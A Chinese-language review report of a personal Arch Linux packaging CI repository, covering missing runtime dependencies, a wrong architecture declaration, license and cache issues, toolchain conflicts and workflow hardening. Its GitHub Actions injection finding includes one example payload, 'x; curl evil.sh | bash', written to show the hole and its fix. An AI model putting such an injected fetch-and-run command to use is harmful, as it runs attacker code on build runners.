# arch-cloud-pkgs 项目审查报告

审查日期：2026-09-02
审查范围：全部 9 个文件（1 workflow / 1 script / 3 包 × PKGBUILD+build.conf / README / .gitignore）
审查方法：静态代码审查 + 上游仓库事实核对（GitHub API：release/tag 版本、文件清单、官方 PKGBUILD、xtask 源码）

---

> **状态更新（2026-09-02）**：本报告中的原始问题已在后续变更中修复；
> 2026-09-02 17:25 进行了二次加固：补齐 rtk-termux 的 `--ignorearch`、为 NDK 下载增加 SHA-1 校验、
> 收紧 `build.conf` 解析与路径校验、把关键工具链/产物检查升级为失败即终止，并接通 `ndk_platform` 配置。
> 尚未在真实 Arch 容器中执行完整构建，需等待 CI 验证。
>
> 修复过程中另发现两处报告未覆盖的事实，一并修掉了：
> - Arch 的 `rustup` 包 `conflicts=('cargo' 'rust' 'rustfmt')`，而 `rtk-termux` 的
>   `makedepends` 同时写了 `rust` 和 `rustup`，两者互斥；
> - `sudo -u builder` 会重置环境变量，`GITHUB_ENV` 里的工具链路径进不了 makepkg，
>   因此 `CARGO_HOME` / `RUSTUP_HOME` 在 PKGBUILD 内做了同值兜底。

---

## 总体评价

设计水准明显高出同类"个人云端打包仓库"：选包 job 与构建 job 分离、matrix 并行、工具链缓存（内容寻址，跨包共享）与包缓存（编译产物，按包隔离）做了正确的分层，缓存恢复后的 `chown` 归还也考虑到了。这是一份有架构意识的 CI。

但存在 **3 个会真实造成故障的问题**（依赖缺失、架构声明错误、命令注入面），以及若干"文档与实现不一致"的隐患。以下按严重程度排列。

---

## P0 — 必须修复（会造成实际故障或安全事故）

### 1. `we-layerd` 运行时依赖缺失，装完可能起不来

与上游官方 PKGBUILD（`package/archlinux/PKGBUILD`，v0.2.7）逐项比对：

| 依赖 | 官方 `depends` | 本仓库 | 后果 |
|------|:---:|:---:|------|
| `libdrm` | ✅ | ❌ | renderer 走 DMA-BUF 零拷贝路径，缺库则退化或加载失败 |
| `libva` | ✅ | ❌ | VA-API 硬件解码路径链接失败 |
| `gst-plugins-bad-libs` | ✅ | 仅 `makedepends` | `libwallpaper-engine-renderer.so` 是 **dlopen** 加载的，运行时才解析符号，编译期不会报错 |

第三项尤其危险：`libwallpaper-engine-renderer.so` 在构建时只被链接/拷贝，运行时才由 `we-layerd` 动态加载，因此**构建能过、CI 全绿、用户装完才发现跑不起来**——这是最难排查的一类故障。

修复：将 `gst-plugins-bad-libs` 从 `makedepends` 移入 `depends`，并补齐 `libdrm`、`libva`。

### 2. `rtk-termux` 架构声明错误，本地 `pacman -U` 会污染主机

```bash
arch=('x86_64' 'aarch64')        # 但 build() 只产出 aarch64-linux-android 二进制
package() { install -Dm755 ".../aarch64-linux-android/release/rtk" "$pkgdir/usr/bin/rtk" }
```

该包产物**永远是 Android Bionic 的 aarch64 ELF**。声明 `x86_64` 意味着 pacman 允许用户在 x86_64 主机上直接 `pacman -U` 安装，结果是 `/usr/bin/rtk` 被替换成一个在本机无法执行的 Android 二进制，且 `provides=('rtk') conflicts=('rtk')` 会顶掉正常的 rtk。

README 的"本地安装"章节（`sudo pacman -U *.pacman`）恰好会诱导这个操作。

修复建议（三选一）：
- `arch=('aarch64')` —— 阻止 x86_64 主机误装；
- 改名为 `rtk-termux-aarch64` 并在 README 明示"仅用于提取二进制，勿在本机安装"；
- 若目标是给 Termux 用，应产出 Termux 的 `.deb`/裸二进制（目前 `extra_artifacts` 已经吐裸二进制，这条路其实已经够了，pacman 包本身可以考虑去掉）。

### 3. GitHub Actions 表达式注入面

```yaml
INPUT="${{ inputs.packages }}"                       # build.yml:39
CONF="pkgs/${{ matrix.pkg }}/build.conf"             # build.yml:108
EXTRA="${{ steps.conf.outputs.extra_artifacts }}"    # build.yml:176
```

`${{ }}` 在 `run:` 中是**文本替换后交给 shell 执行**。`inputs.packages` 是用户可控输入，构造如 `x; curl evil.sh | bash` 即可在 runner 上执行任意命令。同一条链路还有第二步放大：矩阵值流入 `prepare-toolchain.sh` 后被 `source "$conf"` 直接执行。

当前仓库为个人私有仓库，风险有限；但这是应当根除的模式习惯，且该仓库未来若公开或加协作者即为现成漏洞。

修复：改用 `env:` 传值，shell 内用 `"$VAR"` 引用。

```yaml
- name: 确定要构建的包列表
  env:
    INPUT_PKGS: ${{ inputs.packages }}
    EVENT_NAME: ${{ github.event_name }}
    BEFORE_SHA: ${{ github.event.before }}
  run: |
    INPUT="$INPUT_PKGS"
    ...
```

---

## P1 — 重要（正确性 / 一致性 / 可维护性）

### 4. `we-layerd` 许可证声明错误

`license=('MIT')`，但上游 v0.2.7 仓库根目录**不存在任何 LICENSE / COPYING 文件**（已 HTTP 404 核实 `LICENSE`、`LICENSE.md`、`COPYING`）。上游官方 PKGBUILD 自己声明的是：

```bash
license=('custom:unlicensed')
```

在没有许可证文本的情况下声明 MIT 是**法律上错误的陈述**，会误导使用者对权利的判断。应改为 `custom:unlicensed`，并在 README 注明上游未授权。

### 5. `we-gui.desktop` 未安装，应用菜单里找不到 GUI

`package()` 用的是 `cargo xtask install --prefix /usr`。核对上游 `xtask/src/main.rs` 的 `install()`，其安装清单只有 5 项：

```
bin/we-layerd
bin/we-gui
lib/libwallpaper-engine-renderer.so
lib/we-cef-helper
share/gnome-shell/extensions/<UUID>
```

**不含 `.desktop` 文件**。而上游官方 PKGBUILD 是手工安装的，多了一步：

```bash
install -Dm644 apps/we-gui/assets/we-gui.desktop "${pkgdir}/usr/share/applications/we-gui.desktop"
```

结果：`we-gui` 只能命令行启动，不会出现在任何应用启动器里。README 明确说"启动图形界面 `we-gui`"，体验断裂。补一行 `install -Dm644` 即可。

顺带说明：xtask 的 `install()` 内部会再跑一次 `cargo build -p we-layerd -p we-gui`，依赖 `target` 符号链接与 `CARGO_TARGET_DIR` 落到同一目录才能命中缓存。当前 PKGBUILD 的写法（symlink + 环境变量在同一 shell 中持续）是对的，但很脆，建议加一行注释说明"不要动 build() 里的 symlink"。

### 6. README 关于缓存失效的描述与实现不符

README 第 25 行：

> 缓存会因 PKGBUILD 变化自动失效，本次为全量重编

实现上并非如此。`build.yml:154` 配了回退键：

```yaml
key: build-<pkg>-<hash(PKGBUILD,build.conf)>-<ndk>-<arch>
restore-keys: |
  build-<pkg>-        # ← 未命中精确 key 时会恢复旧缓存
```

改 `pkgver` 后精确 key 未命中，**回退键会恢复上一次的 `target/`**。cargo 会重编变更的 crate（增量编译，这本身是好事），但 `target/we-renderer-upstream/install/` 这个由 cmake 产出的暂存目录不会被自动清理，若上游构建脚本的指纹判断失效，可能拷入旧版本产物。

两处修正其一：
- 改 README 描述为"增量重编"，并说明回退键语义；或
- 若确实要全量重编，去掉 `restore-keys`，精确 key 未命中即冷启动。

### 7. `rtk-termux` 版本落后上游一个发布

| 项 | 值 |
|---|---|
| PKGBUILD `pkgver` | 0.46.0 |
| 上游最新 release | **v0.47.0**（2026-09-02 发布，即审查当天） |

其余两个包版本正确：`we-layerd` 0.2.7 = 上游最新 tag；`wayland-pipewire-idle-inhibit` 0.7.1 = 上游最新 tag（`LICENCE` 与 `.service` 文件在 v0.7.1 中均存在，已核实）。

rtk 上游至今仍未提供 `aarch64-linux-android`（Bionic）预编译产物，因此本包的**存在理由仍然成立**。这正是二期 Roadmap 的 nvchecker 要解决的问题。

### 8. `build.conf` 解析逻辑重复实现，且存在死配置

`build.conf` 被解析两次：
- `build.yml:104-116` 内联 `source` 并输出 4 个 outputs；
- `.github/scripts/prepare-toolchain.sh:43-46` 又 `source` 一遍并输出**同样**的 4 个 outputs（写入一个没有 `id` 的 step，无人消费）。

两处默认值（`target` / `r26d` / `false`）硬编码了两份，改一处忘一处是迟早的事。建议只保留脚本内的解析，workflow 用 `id: toolchain` 承接其输出。

同时 `rtk-termux/build.conf` 里的 `ndk_platform=28` 是**死配置**——脚本与 workflow 都不读它，`--platform 28` 是硬编码在 PKGBUILD 里的。要么接上，要么删掉。

### 9. 双 Rust 工具链共存，cargo / rustup 归属不确定

`rtk-termux` 的 `makedepends` 含 `rust` **和** `rustup`，`build.conf` 的 `extra_pacman_deps` 又装一次 `rustup`。于是容器内同时存在：

- Arch 官方 rust：`/usr/bin/{rustc,cargo}`
- rustup 管理的 stable：`/root/.cargo/bin`（**默认不在非登录 shell 的 PATH 里**）
- builder 的 rustup：`/home/builder/.cargo/bin`

后果：`rustup target add aarch64-linux-android`（第 84 行）加到了 rustup 的工具链上，但随后 `cargo ndk` 调用到的可能是 `/usr/bin/cargo`（Arch 版），两者不是同一套 sysroot；`cargo install cargo-ndk` 同理。当前之所以能跑通，靠的是 `cargo-ndk` 自己会用 NDK 的 clang，绕开了 rustup target。这是**侥幸正确**，不是设计正确。

建议二选一并显式化：
- 全 rustup：在 `GITHUB_PATH` 前置 `/root/.cargo/bin` 与 `/home/builder/.cargo/bin`，`makedepends` 去掉 `rust`；
- 全 Arch：`makedepends=('rust')`，删掉所有 `rustup` 相关逻辑。

### 10. `pacman -Syu` 在 `archlinux:base-devel` 上的 keyring 陈旧风险

`build.yml:101` 直接 `pacman -Syu --needed --noconfirm`。Arch 官方 Docker 镜像的打包时间与本地 keyring 版本存在窗口期，镜像内 `archlinux-keyring` 过旧时 `-Syu` 会以签名校验失败告终。这是 Arch CI 里最经典的间歇性故障，与代码无关，但会让构建随机红。

标准缓解：

```yaml
- name: 同步 pacman 数据库
  run: |
    pacman -Sy --noconfirm archlinux-keyring || true
    pacman -Syu --needed --noconfirm
```

### 11. README "已收录包" 表格缺 `rtk-termux`

表格只登记了 2 个包，仓库实际有 3 个。`rtk-termux` 是配置最复杂、唯一需要 NDK 的包，却完全没进文档。

---

## P2 — 改进建议

| # | 位置 | 问题 | 建议 |
|---|------|------|------|
| 12 | `build.yml` | 无顶层 `permissions:` | 加 `permissions: contents: read`，最小权限 |
| 13 | `build.yml` | 无 `timeout-minutes` | 默认 360 分钟；给 `build` 设 `timeout-minutes: 120`，给 `select` 设 5，避免卡死烧 runner 时长 |
| 14 | `build.yml` | 无定时重建 | Arch 是滚动发行版，glibc / gcc-libs soname bump 后旧包静默失效。加 `schedule: cron: '17 4 1 * *'` 每月全量重建 |
| 15 | `build.yml` | Action 版本落后 | 现用 `cache@v5 / checkout@v5 / upload-artifact@v5 / download-artifact@v5`；上游已有 `v6 / v7 / v7 / v8`。建议升到最新 major |
| 16 | `build.yml:92` | sudoers 文件权限 | `>` 重定向得到 0644；sudo 推荐 0440。补 `chmod 0440 /etc/sudoers.d/builder` |
| 17 | `.gitignore` | 遗漏产物目录 | 缺 `pkgs/*/extra_artifacts/` 与 `pkgs/*/rtk-aarch64-android` |
| 18 | 两个 tarball 源 | `sha256sums=('SKIP')` | git tag 源（we-layerd）尚可接受；GitHub 自动生成的 tarball 无完整性校验，上游移动 tag 或仓库被接管时不可察觉。建议改为固定 `sha256sums` 值 |
| 19 | `rtk-termux/PKGBUILD:37` | `2>/dev/null` 吞掉错误 | `cargo ndk ... 2>/dev/null \|\| fallback`：主路径失败时**看不到任何错误信息**，只能看到 fallback 的报错。改为完整输出或用 `set -o pipefail` + 日志分组 |
| 20 | `we-layerd/PKGBUILD:48` | `provides=("we-layerd")` 自指 | `pkgname` 已是 `we-layerd`，`provides` 自指会被 namcap 标记为冗余。真正需要 `provides` 的是 `-aur` 后缀那个包 |
| 21 | 全局 | 无产物校验步骤 | 建议加一步 `namcap` 或至少 `pacman -Qip` 打印元信息，让包内容在 CI 里可见 |
| 22 | `build.yml:152` | `cache_dirs` 名义复数，实际只支持单目录 | 多目录会拼成 `pkgs/x/a b` 这一行路径。要么改名为 `cache_dir` 并断言单值，要么支持多行 `path:` |

---

## 值得肯定的设计

以下三点是这个仓库真正的价值所在，重构时应保留：

1. **缓存分层正确**。工具链层（NDK、cargo registry、SRCDEST）是内容寻址的只读资源，跨包共享；包层（`target/`）是编译产物，按包严格隔离且 key 含包名+PKGBUILD+build.conf+NDK 版本+架构。这个划分是对的，很多同类仓库会把整个 workspace 一把缓存，导致包与包之间交叉污染。

2. **`src/` 不缓存，只缓存 `SRCDEST`**。源码现场与下载副本分离，杜绝"解压后的源码与中间产物混杂"的脏缓存，同时 `CARGO_TARGET_DIR=$startdir/target` 把编译产物提到包目录。这是让增量编译真正生效的关键一步。

3. **`select` job 跑在裸 runner 上**。把"算矩阵"这件事从 `archlinux` 容器里拿出来，省掉了每个 matrix job 都要 `fetch-depth: 0` 全量克隆的开销，构建 job 只需浅克隆。

---

## 建议的修复顺序

1. P0 三项（依赖补齐、架构声明、注入面改造）—— 都会造成真实故障
2. P1 第 4、5、7 项（许可证、.desktop、版本）—— 改动小、收益直接
3. P1 第 6、8、9、10 项（文档/实现一致性、DRY、工具链、keyring）—— 影响长期可维护性
4. P2 批量处理
